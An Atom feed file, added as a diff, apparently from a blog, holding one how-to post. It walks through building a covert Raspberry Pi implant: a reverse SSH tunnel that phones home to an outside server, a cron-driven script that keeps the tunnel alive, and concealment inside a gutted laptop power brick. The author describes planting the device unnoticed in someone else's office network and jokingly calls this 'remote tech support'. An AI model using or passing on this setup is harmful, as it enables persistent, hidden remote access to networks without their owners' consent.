@@ -1,0 +1,157 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: ssh tunnel | TunnelsUP]]></title>
+  <link href="http://tunnelsup.github.io/tup/tag/ssh-tunnel/atom.xml" rel="self"/>
+  <link href="http://tunnelsup.github.io/"/>
+  <updated>2016-09-29T22:17:21-07:00</updated>
+  <id>http://tunnelsup.github.io/</id>
+  <author>
+    <name><![CDATA[Jack]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Raspberry Pi: Phoning home using a reverse remote ssh tunnel]]></title>
+    <link href="http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/"/>
+    <updated>2013-05-08T00:00:00-07:00</updated>
+    <id>http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel</id>
+    <content type="html"><![CDATA[<p><img src="/images/pi6.jpg" alt="Pi IMG" /><br>
+What&rsquo;s this? Just an ordinary powerbrick? Read on to find out why this is an incredibly dangerous thing to see in your office.</p>
+
+<p>When I received my raspberry pi I immediately wanted to use it as a <del>hacking</del> remote tech support tool. The idea was to be able to plug it in somewhere and it be small enough that it&rsquo;s not noticed in someone&rsquo;s network. Then if I could access it remotely I am in their network and can do things.</p>
+
+<h2>Part 1: Setting up the Pi</h2>
+
+<p>The problem is that if I plug this in somewhere in the world and leave it I need it to phone home so I can gain remote connectivity to it. I know my home&rsquo;s IP but I don&rsquo;t know the Pi&rsquo;s IP. I want it to be a plug in and run away type of scenario and not one that I&rsquo;ll be hooking up any monitor or keyboard or anything.</p>
+
+<h3>Pre-configuration</h3>
+
+<p>Before beginning you need to have the following:</p>
+
+<ul>
+<li>Raspberry Pi with a Linux OS on it</li>
+<li>Raspberry Pi is configured to receive a DHCP address</li>
+<li>Raspberry Pi is configured to receive ssh connections</li>
+<li>A seperate linux server that is reachable by ssh from the internet. This server should have a static public IP.</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>It should be easy enough to figure out how to complete these on your own. With the above, you should be able ssh to the Pi remotely if you know its IP. Well you don&rsquo;t know its IP and even if you did it is probably behind a firewall which makes it impossible to get to. Or so you think.</p>
+
+<p>What you&rsquo;ll need is a linux server that has a persistent IP. One that you can ssh into from anywhere in the world. Suppose it&rsquo;s IP is 25.25.25.25. Even though my home network gets a dynamic IP from my ISP it usually stays the same for weeks and even years. All I&rsquo;ve done is forwarded port 22 through the firewall to a linux server to make this work.</p>
+
+<h3>Setting up the ssh certificate on the Pi</h3>
+
+<p>From the Raspberry Pi you should be able to ssh to this linux server. Test it to be sure. So now you want to set it up so the authentication is certificate based (this way the Pi can be set up to auto ssh into the server without being prompted for a password).</p>
+
+<p>Follow this guide for setting up <a href="/ssh-without-password/">automatic ssh login using ssh keys</a>.</p>
+
+<h3>Creating the Reverse SSH tunnel</h3>
+
+<p>Now comes the fun part. Create a reverse remote ssh tunnel to that host to forward connections back to the Pi. Confused? Here look at this command you would issue from the Pi:</p>
+
+<p><code>
+ssh -N -R 2222:localhost:22 serverUser@25.25.25.25
+</code></p>
+
+<p>The Pi is ssh'ing to the server at 25.25.25.25 using the username &ldquo;serverUser&rdquo;. Upon doing so, it&rsquo;s telling that server to open port 2222. Any connections coming into the server on port 2222 forward them over the tunnel back to the Pi on port 22. The -N tag is saying we don&rsquo;t need to actually send any ssh commands once connected.</p>
+
+<p>Once the Pi sets up that remote tunnel; from the server it connected to you can do this:</p>
+
+<p><code>
+ssh -l piUser -p 2222 localhost
+</code></p>
+
+<p>Now you should be ssh&rsquo;d into the Pi using port 2222 on the linux server! Awesome!</p>
+
+<p>Why did this work? The linux server is listening on port 2222 for incoming ssh connections. If it receives one, it will forward all traffic it receives into the previous ssh connection that was established already. That is essentially what the remote tunnel does.</p>
+
+<h3>Making it persistent (always on)</h3>
+
+<p>Next is to make this a persistent thing. You want the Pi to keep trying to build this ssh tunnel always and if it goes down try to bring it back. We&rsquo;ll do this using a bash script and cron job.</p>
+
+<p>Create a file on the Pi called ~/create_ssh_tunnel.sh and put this in it:</p>
+
+<p>``` bash</p>
+
+<h1>!/bin/bash</h1>
+
+<p>createTunnel() {
+  /usr/bin/ssh -N -R 2222:localhost:22 <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x73;&#x65;&#x72;&#x76;&#x65;&#114;&#x55;&#x73;&#101;&#x72;&#64;&#x32;&#53;&#46;&#50;&#53;&#46;&#50;&#53;&#46;&#x32;&#53;">&#x73;&#101;&#114;&#x76;&#x65;&#114;&#x55;&#115;&#101;&#114;&#x40;&#x32;&#x35;&#46;&#50;&#53;&#46;&#50;&#x35;&#46;&#x32;&#x35;</a>
+  if [[ $? -eq 0 ]]; then</p>
+
+<pre><code>echo Tunnel to jumpbox created successfully
+</code></pre>
+
+<p>  else</p>
+
+<pre><code>echo An error occurred creating a tunnel to jumpbox. RC was $?
+</code></pre>
+
+<p>  fi
+}
+/bin/pidof ssh
+if [[ $? -ne 0 ]]; then
+  echo Creating new tunnel connection
+  createTunnel
+fi
+```</p>
+
+<p>What this program is doing is checking to see if there&rsquo;s a process running called &lsquo;ssh&rsquo;. If there isn&rsquo;t then start the ssh tunnel.</p>
+
+<p>Next make it executable by doing the following:</p>
+
+<p><code>
+chmod 700 ~/create_ssh_tunnel.sh
+</code></p>
+
+<p>Now start the crontab.</p>
+
+<p><code>
+crontab -e
+</code>
+Place this in as your cron job (every minute check if the ssh connection is up, if not, attempt to bring it up)</p>
+
+<p><code>
+*/1 * * * * ~/create_ssh_tunnel.sh &gt; tunnel.log 2&gt;&amp;1
+</code>
+To troubleshoot any problems in this you can view the tunnel.log file.</p>
+
+<p>Now let&rsquo;s take a step back and look at what we&rsquo;ve done. When the Raspberri Pi is on, it will check every minute to see if an ssh connection to your linux server exists. If it doesn&rsquo;t it will create one. The tunnel it creates is really a reverse remote tunnel. Once the tunnel is up, anyone who ssh&rsquo;s into port 2222 of the linux server will then be redirected to the Pi. Incredible!</p>
+
+<h2>Part 2: Concealing the Pi</h2>
+
+<p>I found an old powerbrick for a laptop and gutted it.<br>
+<img src="/images/pi2.jpg" alt="Pi IMG" /></p>
+
+<p>The raspberry pi almost fit. I had to solder off the S-Video port to get it to fit just right.<br>
+<img src="/images/pi3.jpg" alt="Pi IMG" /></p>
+
+<p>Then I had to hook power up to it. In order to do this I simply took apart a USB charger. Took the plastic casing off to save space and cut the cord to save even more space. Then I soldered where the powerbrick power feed is into the USB power feed. This way when I power up the brick, it&rsquo;ll give power to the USB charger which will in turn power the Pi.<br>
+<img src="/images/pi4.jpg" alt="Pi IMG" /></p>
+
+<p>Lastly was finding a black ethernet cable so both cables coming out of the power brick are black and look inconspicuous.<br>
+<img src="/images/pi5.jpg" alt="Pi IMG" /></p>
+
+<p>Here are pictures of it in its special case:<br>
+<img src="/images/pi6.jpg" alt="Pi IMG" /><br>
+<img src="/images/pi7.jpg" alt="Pi IMG" /></p>
+
+<h2>Part 3: Testing it</h2>
+
+<p>Check it out! <br>
+<img src="/images/pi1.jpg" alt="Pi IMG" /></p>
+
+<p>I have this plugged into an office somewhere. It looks weird when you stare at it but put it behind a plant and nobody will ever notice it (except the guy who waters the plants).</p>
+
+<p>Once I plugged it in I went back home. Right after the Pi got an IP address it created a tunnel to my home server. When I tried ssh'ing into port 2222 of my home server I was redirected to the Pi. Now I am on a computer in someone elses network. Woohoo! Now I can do remote tech support more effectively.</p>
+]]></content>
+  </entry>
+  
+</feed>
